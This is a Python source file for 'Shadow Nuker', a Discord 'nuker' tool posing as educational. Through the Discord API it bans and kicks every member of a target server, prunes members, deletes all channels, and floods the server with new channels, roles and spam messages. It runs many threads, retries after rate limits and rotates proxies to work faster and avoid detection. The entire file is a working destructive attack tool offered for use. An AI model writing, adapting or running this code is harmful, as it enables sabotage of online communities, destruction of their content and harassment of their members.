
"""
SHADOW NUKER BY YUP-CONSOLE

THIS TOOL IS FOR EDUCATION PURPOSE ONLY
I'M (YUP-CONSOLE) ISN'T RESPONSIBLE FOR ANYTHING HAPPENED USING THIS TOOL
"""

import threading, discord, random, httpx, json, time, os
from discord.ext import commands
from itertools import cycle

VERSION = '1.0.0'

__intents__ = discord.Intents.default()
__intents__.members = True
__proxies__, __client__, __config__, __threads__ = cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", help_command=None, intents=__intents__), json.load(open("config.json", "r", encoding="utf-8")), 30
token = __config__["token"]
os.system("cls") if os.name == "nt" else os.system("clear")

shadow_art = """
{}                       ██████  ██░ ██  ▄▄▄      ▓█████▄  ▒█████   █     █░
                     ▒██    ▒ ▓██░ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▓█░ █ ░█░
                     ░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ░██   █▌▒██░  ██▒▒█░ █ ░█ 
                       ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░░█░ █ ░█ 
                     ▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░▒████▓ ░ ████▓▒░░░██▒██▓ 
                     ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  
                     ░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ▒ ░ ░  
                     ░  ░  ░   ░  ░░ ░  ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░   ░  
                           ░   ░  ░  ░      ░  ░   ░        ░ ░      ░    
                                            ░{}
""".format("\x1b[38;5;51m", "\x1b[0m")
options = """
              ╚╦╗                                                             ╔╦╝
         ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
         ╩ ({0}{1}{2}) {3}Ban Members        ║ ({4}{5}{6}) {7}Create Channels     ║ ({20}{21}{22}) {23}Rename Channels    ╩
           ({12}{13}{14}) {15}Kick Members       ║ ({16}{17}{18}) {19}Create Roles        ║ ({8}{9}{10}) {11}Spam Channels      
           ({24}{25}{26}) {27}Prune Members      ║ ({28}{29}{30}) {31}Delete Channels     ║ ({32}{33}{34}) {35}Exit            
         ╦                        ║                         ║                        ╦
         ╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝
              ╔╩╝                                                             ╚╩╗
""".format(
    "\x1b[38;5;51m", "1", "\x1b[0m", "",  # 0-3: Ban Members
    "\x1b[38;5;51m", "4", "\x1b[0m", "",  # 4-7: Create Channels
    "\x1b[38;5;51m", "8", "\x1b[0m", "",  # 8-11: Spam Channels
    "\x1b[38;5;51m", "2", "\x1b[0m", "",  # 12-15: Kick Members
    "\x1b[38;5;51m", "5", "\x1b[0m", "",  # 16-19: Create Roles
    "\x1b[38;5;51m", "7", "\x1b[0m", "",  # 20-23: Rename Channels
    "\x1b[38;5;51m", "3", "\x1b[0m", "",  # 24-27: Prune Members
    "\x1b[38;5;51m", "6", "\x1b[0m", "",  # 28-31: Delete Channels
    "\x1b[38;5;51m", "9", "\x1b[0m", ""   # 32-35: Exit
)

class Shadow:
    def __init__(self):
        self.proxy = "http://" + next(__proxies__) if __config__.get("proxy", False) else None
        self.session = httpx.Client(proxies=self.proxy)
        self.version = 'v10'
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []

    def execute_ban(self, guild: discord.Guild, member_id: str, token: str):
        try:
            if not member_id.isdigit():
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Invalid member ID \x1b[31m{member_id}")
                return
            payload = {"delete_message_seconds": random.randint(0, 604800)}
            response = self.session.put(
                f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member_id}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            if response.status_code in [200, 201, 204]:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Banned \x1b[38;5;51m{member_id}")
                self.banned.append(member_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_ban(guild, member_id, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m{member_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to ban \x1b[31m{member_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error banning \x1b[31m{member_id}: {str(e)}")

    def execute_kick(self, guild: discord.Guild, member_id: str, token: str):
        try:
            if not member_id.isdigit():
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Invalid member ID \x1b[31m{member_id}")
                return
            response = self.session.delete(
                f"https://discord.com/api/v10/guilds/{guild.id}/members/{member_id}",
                headers={"Authorization": f"Bot {token}"}
            )
            if response.status_code in [200, 201, 204]:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Kicked \x1b[38;5;51m{member_id}")
                self.kicked.append(member_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_kick(guild, member_id, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m{member_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to kick \x1b[31m{member_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error kicking \x1b[31m{member_id}: {str(e)}")

    def execute_prune(self, guild: discord.Guild, days: int, token: str):
        try:
            payload = {"days": days}
            response = self.session.post(
                f"https://discord.com/api/v10/guilds/{guild.id}/prune",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            if response.status_code == 200:
                pruned = response.json().get('pruned', 0)
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Pruned \x1b[38;5;51m{pruned}\x1b[0m members")
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_prune(guild, days, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for pruning")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to prune: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error pruning: {str(e)}")

    def execute_rename_channels(self, guild: discord.Guild, channel_id: str, new_name: str, token: str):
        try:
            payload = {"name": new_name.replace(" ", "-")}
            response = self.session.patch(
                f"https://discord.com/api/v10/channels/{channel_id}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Renamed channel to \x1b[38;5;51m{new_name}")
                self.channels.append(channel_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_rename_channels(guild, channel_id, new_name, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for channel \x1b[38;5;208m{channel_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to rename channel \x1b[31m{channel_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error renaming channel \x1b[31m{channel_id}: {str(e)}")

    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        try:
            payload = {
                "type": type,
                "name": channelsname.replace(" ", "-"),
                "permission_overwrites": []
            }
            response = self.session.post(
                f"https://discord.com/api/v10/guilds/{guildid}/channels",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            if response.status_code == 201:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Created \x1b[38;5;51m#{channelsname}")
                self.channels.append(1)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_crechannels(guildid, channelsname, type, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m#{channelsname}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to create \x1b[31m#{channelsname}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error creating channel \x1b[31m#{channelsname}: {str(e)}")

    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        try:
            colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
            payload = {
                "name": rolesname,
                "color": colors
            }
            response = self.session.post(
                f"https://discord.com/api/v10/guilds/{guildid}/roles",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Created \x1b[38;5;51m@{rolesname}")
                self.roles.append(1)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_creroles(guildid, rolesname, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m@{rolesname}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to create \x1b[31m@{rolesname}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error creating role \x1b[31m@{rolesname}: {str(e)}")

    def execute_delchannels(self, channel: str, token: str):
        try:
            response = self.session.delete(
                f"https://discord.com/api/v10/channels/{channel}",
                headers={"Authorization": f"Bot {token}"}
            )
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Deleted \x1b[38;5;51m{channel}")
                self.channels.append(channel)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_delchannels(channel, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m{channel}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to delete \x1b[31m{channel}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error deleting channel \x1b[31m{channel}: {str(e)}")

    def execute_massping(self, channel: str, content: str, token: str):
        try:
            response = self.session.post(
                f"https://discord.com/api/v10/channels/{channel}/messages",
                headers={"Authorization": f"Bot {token}"},
                json={"content": content}
            )
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Spammed \x1b[38;5;51m{content}\x1b[0m in \x1b[38;5;51m{channel}")
                self.messages.append(channel)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_massping(channel, content, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m{channel}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to spam \x1b[31m{channel}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error spamming \x1b[31m{channel}: {str(e)}")

    def menu(self):
        os.system(f"cls & title Shadow Nuker ^| Authenticated as: {__client__.user.name}#{__client__.user.discriminator}") if os.name == "nt" else os.system("clear")
        print(shadow_art + options + "\n")
        ans = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Option\x1b[38;5;51m:\x1b[0m ")

        if ans in ["1", "01"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.banned.clear()
            start_time = time.time()
            members = [str(member.id) for member in guild.members]
            if not members:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No members found in the guild")
                time.sleep(1.5)
                self.menu()
            for member_id in members:
                t = threading.Thread(target=self.execute_ban, args=(guild, member_id, token))
                t.start()
                time.sleep(0.01)
                while threading.active_count() >= __threads__:
                    t.join()
            end_time = time.time()
            elapsed = end_time - start_time
            rate = len(self.banned) / elapsed if elapsed > 0 else 0
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Banned {len(self.banned)}/{len(members)} (Rate: {rate:.2f}/s)")
            time.sleep(1.5)
            self.menu()

        elif ans in ["2", "02"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.kicked.clear()
            start_time = time.time()
            members = [str(member.id) for member in guild.members]
            if not members:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No members found in the guild")
                time.sleep(1.5)
                self.menu()
            for member_id in members:
                t = threading.Thread(target=self.execute_kick, args=(guild, member_id, token))
                t.start()
                time.sleep(0.01)
                while threading.active_count() >= __threads__:
                    t.join()
            end_time = time.time()
            elapsed = end_time - start_time
            rate = len(self.kicked) / elapsed if elapsed > 0 else 0
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Kicked {len(self.kicked)}/{len(members)} (Rate: {rate:.2f}/s)")
            time.sleep(1.5)
            self.menu()

        elif ans in ["3", "03"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            days = int(input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Days\x1b[38;5;51m:\x1b[0m "))
            self.execute_prune(guild, days, token)
            time.sleep(1.5)
            self.menu()

        elif ans in ["4", "04"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            type = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Channels Type ['t', 'v']\x1b[38;5;51m:\x1b[0m ")
            type = 2 if type.lower() == "v" else 0
            amount = int(input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Amount\x1b[38;5;51m:\x1b[0m "))
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(__config__["nuke"]["channels_name"]), type, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Created {len(self.channels)}/{amount} channels")
            time.sleep(1.5)
            self.menu()

        elif ans in ["5", "05"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            amount = int(input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Amount\x1b[38;5;51m:\x1b[0m "))
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(__config__["nuke"]["roles_name"]), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Created {len(self.roles)}/{amount} roles")
            time.sleep(1.5)
            self.menu()

        elif ans in ["6", "06"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Deleted {len(self.channels)}/{len(channels)} channels")
            time.sleep(1.5)
            self.menu()

        elif ans in ["7", "07"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_rename_channels, args=(guild, channel['id'], random.choice(__config__["nuke"]["channels_name"]), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Renamed {len(self.channels)}/{len(channels)} channels")
            time.sleep(1.5)
            self.menu()

        elif ans in ["8", "08"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.messages.clear()
            self.channels.clear()
            amount = int(input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Amount\x1b[38;5;51m:\x1b[0m "))
            channels = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                self.channels.append(channel['id'])
            channelz = cycle(self.channels)
            for i in range(amount):
                t = threading.Thread(target=self.execute_massping, args=(next(channelz), random.choice(__config__["nuke"]["messages_content"]), token))
                t.start()
                while threading.active_count() >= __threads__ - 15:
                    t.join()
            time.sleep(3)
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Spammed {len(self.messages)}/{amount} messages")
            time.sleep(1.5)
            self.menu()

        elif ans in ["9", "09"]:
            print("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Thanks for using Shadow!")
            time.sleep(1.5)
            os._exit(0)

        else:
            print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid option, please choose 1-9")
            time.sleep(1.5)
            self.menu()

@__client__.event
async def on_ready():
    try:
        await __client__.change_presence(status=discord.Status.online, activity=discord.Game(name="Shadow Nuker"))
        print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Authenticated as\x1b[38;5;51m: \x1b[0m{__client__.user.name}#{__client__.user.discriminator}")
        time.sleep(1.5)
        Shadow().menu()
    except Exception as e:
        print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error setting status: {str(e)}")
        time.sleep(1.5)
        Shadow().menu()

if __name__ == "__main__":
    try:
        os.system("title Shadow Nuker ^| Authentication & mode con: cols=95 lines=25") if os.name == "nt" else os.system("clear")
        guildid = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Guild ID\x1b[38;5;51m:\x1b[0m ")
        __client__.run(token, bot=True)
    except Exception as e:
        print(f"\x1b[0m(\x1b[31m-\x1b[0m) {str(e)}")
        time.sleep(1.5)
        os._exit(0)